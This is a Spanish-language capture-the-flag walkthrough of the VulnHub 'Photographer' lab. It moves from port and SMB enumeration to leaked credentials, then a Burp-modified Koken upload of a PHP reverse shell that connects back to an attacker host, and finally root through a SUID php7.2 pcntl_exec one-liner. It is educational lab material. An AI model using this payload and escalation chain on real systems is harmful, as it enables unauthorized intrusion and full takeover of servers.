---
icon: flag
---

# Photographer VulnHub

### Escaneo de puertos

```shell
nmap -p- --min-rate 5000 -sV <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 07:19 EDT
Nmap scan report for 192.168.195.138
Host is up (0.00092s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18
|_http-title: daisa ahomi
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:A5:23:4E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: PHOTOGRAPHER, example.com

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-time: 
|   date: 2024-05-14T11:20:35
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2024-05-14T07:20:36-04:00
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 192.168.195.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.67 seconds
```

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST>
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.195.138/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 319] [--> http://192.168.195.138/assets/]
/images               (Status: 301) [Size: 319] [--> http://192.168.195.138/images/]
/server-status        (Status: 403) [Size: 280]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Si te conectas al `samba` encuentras lo siguiente...

```shell
smbclient -L //<IP> -N
```

Info:

```
 Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
                                         
```

```shell
smbclient //<IP>/sambashare -N
```

Info:

```
mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020
```

```shell
get mailsent.txt
get wordpress.bkp.zip
```

Estos archivos estarian en nuestro `host`...

Si leemos el `.txt` veremos lo siguiente...

```
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

En el otro archivo hay un `WordPress` comprimido, al descomprimirlo veremos muchos archivos realcinados a un wordpres...

### enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 22 04:25:09 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.195.138
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.195.138 )==========================


[+] Got domain/workgroup name: WORKGROUP


 ==============================( Nbtstat Information for 192.168.195.138 )==============================

Looking up status of 192.168.195.138
        PHOTOGRAPHER    <00> -         B <ACTIVE>  Workstation Service
        PHOTOGRAPHER    <03> -         B <ACTIVE>  Messenger Service
        PHOTOGRAPHER    <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.195.138 )==================================
                                                                                                                                                    
                                                                                                                                                    
[+] Server 192.168.195.138 allows sessions using username '', password ''                                                                           
                                                                                                                                                    
                                                                                                                                                    
 ===============================( Getting domain SID for 192.168.195.138 )===============================
                                                                                                                                                    
Domain Name: WORKGROUP                                                                                                                              
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                
                                                                                                                                                    
                                                                                                                                                    
 =================================( OS information on 192.168.195.138 )=================================
                                                                                                                                                    
                                                                                                                                                    
[E] Can't get OS info with smbclient                                                                                                                
                                                                                                                                                    
                                                                                                                                                    
[+] Got OS info for 192.168.195.138 from srvinfo:                                                                                                   
        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)                                                                     
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.195.138 )======================================
                                                                                                                                                    
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                             
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.195.138 )================================
                                                                                                                                                    
                                                                                                                                                    
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PHOTOGRAPHER

[+] Attempting to map shares on 192.168.195.138                                                                                                     
                                                                                                                                                    
//192.168.195.138/print$        Mapping: DENIED Listing: N/A Writing: N/A                                                                           
//192.168.195.138/sambashare    Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                      
                                                                                                                                                    
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                          
//192.168.195.138/IPC$  Mapping: N/A Listing: N/A Writing: N/A

 ==========================( Password Policy Information for 192.168.195.138 )==========================
                                                                                                                                                    
                                                                                                                                                    

[+] Attaching to 192.168.195.138 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] PHOTOGRAPHER
        [+] Builtin

[+] Password Info for Domain: PHOTOGRAPHER

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                
                                                                                                                                                    
                                                                                                                                                    
Password Complexity: Disabled                                                                                                                       
Minimum Password Length: 5


 =====================================( Groups on 192.168.195.138 )=====================================
                                                                                                                                                    
                                                                                                                                                    
[+] Getting builtin groups:                                                                                                                         
                                                                                                                                                    
                                                                                                                                                    
[+]  Getting builtin group memberships:                                                                                                             
                                                                                                                                                    
                                                                                                                                                    
[+]  Getting local groups:                                                                                                                          
                                                                                                                                                    
                                                                                                                                                    
[+]  Getting local group memberships:                                                                                                               
                                                                                                                                                    
                                                                                                                                                    
[+]  Getting domain groups:                                                                                                                         
                                                                                                                                                    
                                                                                                                                                    
[+]  Getting domain group memberships:                                                                                                              
                                                                                                                                                    
                                                                                                                                                    
 =================( Users on 192.168.195.138 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                                                    
                                                                                                                                                    
[I] Found new SID:                                                                                                                                  
S-1-22-1                                                                                                                                            

[I] Found new SID:                                                                                                                                  
S-1-5-32                                                                                                                                            

[I] Found new SID:                                                                                                                                  
S-1-5-32                                                                                                                                            

[I] Found new SID:                                                                                                                                  
S-1-5-32                                                                                                                                            

[I] Found new SID:                                                                                                                                  
S-1-5-32                                                                                                                                            

[+] Enumerating users using SID S-1-5-21-3693138109-3993630114-3057792995 and logon username '', password ''                                        
                                                                                                                                                    
S-1-5-21-3693138109-3993630114-3057792995-501 PHOTOGRAPHER\nobody (Local User)                                                                      
S-1-5-21-3693138109-3993630114-3057792995-513 PHOTOGRAPHER\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                         
                                                                                                                                                    
S-1-22-1-1000 Unix User\daisa (Local User)                                                                                                          
S-1-22-1-1001 Unix User\agi (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                         
                                                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ==============================( Getting printer info for 192.168.195.138 )==============================
                                                                                                                                                    
No printers returned.                                                                                                                               


enum4linux complete on Wed May 22 04:27:43 2024
```

```shell
dirb http://<IP>:8000/ <WORDLIST> -f
```

Info:

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 22 04:57:29 2024
URL_BASE: http://192.168.195.138:8000/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.195.138:8000/ ----
+ http://192.168.195.138:8000/.bash_history (CODE:302|SIZE:0)                                                                                      
+ http://192.168.195.138:8000/.bashrc (CODE:302|SIZE:0)                                                                                            
+ http://192.168.195.138:8000/.cvs (CODE:302|SIZE:0)                                                                                               
+ http://192.168.195.138:8000/.cvsignore (CODE:302|SIZE:0)                                                                                         
+ http://192.168.195.138:8000/.forward (CODE:302|SIZE:0)                                                                                           
+ http://192.168.195.138:8000/.history (CODE:302|SIZE:0)                                                                                           
+ http://192.168.195.138:8000/.listing (CODE:302|SIZE:0)                                                                                           
+ http://192.168.195.138:8000/.passwd (CODE:302|SIZE:0)                                                                                            
+ http://192.168.195.138:8000/.perf (CODE:302|SIZE:0)                                                                                              
+ http://192.168.195.138:8000/.profile (CODE:302|SIZE:0)                                                                                           
+ http://192.168.195.138:8000/.rhosts (CODE:302|SIZE:0)                                                                                            
+ http://192.168.195.138:8000/.ssh (CODE:302|SIZE:0)                                                                                               
+ http://192.168.195.138:8000/.subversion (CODE:302|SIZE:0)                                                                                        
+ http://192.168.195.138:8000/.svn (CODE:302|SIZE:0)                                                                                               
+ http://192.168.195.138:8000/.web (CODE:302|SIZE:0)                                                                                               
+ http://192.168.195.138:8000/MANIFEST.MF (CODE:302|SIZE:0)                                                                                        
+ http://192.168.195.138:8000/Thumbs.db (CODE:302|SIZE:0)                                                                                          
+ http://192.168.195.138:8000/access-log.1 (CODE:302|SIZE:0)                                                                                       
+ http://192.168.195.138:8000/access.1 (CODE:302|SIZE:0)                                                                                           
+ http://192.168.195.138:8000/access_log.1 (CODE:302|SIZE:0)                                                                                       
==> DIRECTORY: http://192.168.195.138:8000/admin/
==> DIRECTORY: http://192.168.195.138:8000/app/                                                                                                    
+ http://192.168.195.138:8000/asdfjkl; (CODE:301|SIZE:0)
```

Descubrimos en el puerto `8000` que hay un panel de login `/admin/` y tenemos ya el usuario y contraseña de `daisa`...

```
user = daisa@photographer.com
pass = babygirl
```

Una vez estamos dentro del panel, nos dirigimos a `content` donde subiremos nuestro archivo `.php.png` con una Reverse Shell, pero antes de darle a importar, debemos de abrir BurpSuit y capturar la peticion de subida para de forma interna cambiar ese `.php.png` a `.php`, le daremos a `Forward` para seguir y ya estaria subida como `.php`, nos volveriamos a la pagina normal y estando a la escucha, abrimos el archivo...

Peticion BurpSuit:

```
POST /api.php?/content HTTP/1.1

Host: 192.168.195.138:8000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

x-koken-auth: cookie

Content-Type: multipart/form-data; boundary=---------------------------168070649923504891441042800227

Content-Length: 1185

Origin: http://192.168.195.138:8000

Connection: close

Referer: http://192.168.195.138:8000/admin/

Cookie: koken_referrer=%2Fcontent%2F; koken_session_ci=oQ9bsuu3dKOife74%2Bch1B974cWritKOt1dv%2BhwBbB0Z%2F2YdhIDDMQdDKwNPIRDPwJYaTdqN6JiPXdLYqdRgCuhmC8LQHEUhOXWoY1ZOeO7SZ1Kt13PFVTqI%2BC7qCWGty5ZbkYmX27%2FC0NYkp6V5ohK5JkMa%2F19AWnyWjANfie17YxeIY0YslSB8XrTxhk9K91hx74pfG1LTe748ZqdJV7GVVDTH8wf%2BD4ZkCKQ%2FiQvJLxL%2B%2BFXWV4qPaxLBv3MjG99kdTW8miK3oFeD1aqMvY%2F3%2F4lUdHIOoTMF3mVIqbBynbVynJGepwGWgx8jwM5m3qqU1dPejHC6TX4CQGZniQ5fF8v1NZcMKYNeF5rk0ExbmqnypBkVTF%2FBZZgmsf8RM7SvtJFdNdxKL6gieKvSHvW5k33pKRODumubfNn%2BZMiIXTfntMzBPgxuiUKOqByeZ%2FsPIpQW59KDvVACfoFsm5eqsIqBp6eTLRmkR6EU51ZTm2HfwONSxjpa7UVHfktPJyHxS3V0iIItI2xNqikpbHIWRsCeMHyLi0o4B5JmRWQ2y%2F%2BdmnMr%2BbJQZL7aNvwkFl3O%2BRu6puXSXDAOJHz2R3QirOYdhRUzAy3RbEoKiPOELnVIYy3vFSHfAlvGZChbfD3TkmVvyAirmKUu18fO7b6IWOGvivUGKktYy%2FsphEoq4V%2BAP7rYSpHNPsInIDmsy4ofyPruby7sBqBnMYlZ9fwhwOe%2F3kzrK%2BUc%2BpVilX6xKgVon0JhQFcSYh7WRiPghrkxvsYtNJE09UymVrvWn%2FIGW1i0W8GacNnxrChQHxWx9aE1FhtpdJkw3ocJUwwEzRnWXSqp6jmTreNEQHG3w3yEfer6wLn7Qgo4A4iBl4tCRdiuMdT0ZK6QW9lU7rblHq35kWY%2FJiHEXtP8Jq6l4Tqamsef%2FTQ5%2Bo9lvB8ZGw79SYYc5RgfHO1CNhhFS5h6bsay8XFrtLOe2%2FGeCq6FCsIn7p9jVlOS5aqK8cXJfMP4IbnFzbtPo6qs8J5Ohtix7admvXB5MWI46p%2BceCIQGH6XvWqdEcupcZKkrx2HOYbeIuUNlLAeOEwe%2B6Ag49kLOXs0f5eRSQLay0%2BNR3hh9OM7WVbmwBLZtAUTARzR4AT0oPxBobGK46ChPvaMRPlmroYQWfWl%2FkalZ5f534x%2Fw6QkRxztAHEamLP9ncnfdjKPF2Re6Gc5DkaV9eCf0bHR1ZTZjrGFe6u1uhOerIyHrTaz9DgB7M8iuLqccTt8vc5LqveuBlmPABHTPO6U7TElO07d636fb4186f93816df2e4a6d3b5e4806e4304b



-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="name"



shell.php

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="chunk"



0

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="chunks"



1

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="upload_session_start"



1716372794

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="visibility"



public

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="license"



all

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="max_download"



none

-----------------------------168070649923504891441042800227

Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

Content-Type: image/jpeg



<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>


-----------------------------168070649923504891441042800227--
```

Donde pone `shell.php.png` lo cambiamos a `shell.php` y le damos a siguiente...

```shell
nc -lvnp <PORT>
```

Y ya estariamos dentro, sanitizamos la shell...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a `/home/daisa/` leemos la flag...

> user.txt (flag1)

```
d41d8cd98f00b204e9800998ecf8427e
```

Si hacemos lo siguiente seremos `root`...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Con esto vemos que tenemos permisos de SUID para lo siguiente...

```
13901509   4772 -rwsr-xr-x   1 root     root        4883680 Jul  9  2020 /usr/bin/php7.2
```

Haremos lo siguiente...

```shell
CMD="/bin/sh"
```

```shell
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Con esto ya seriamos `root`, por lo que leemos la flag...

> proof.txt (flag2)

`````
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
`````
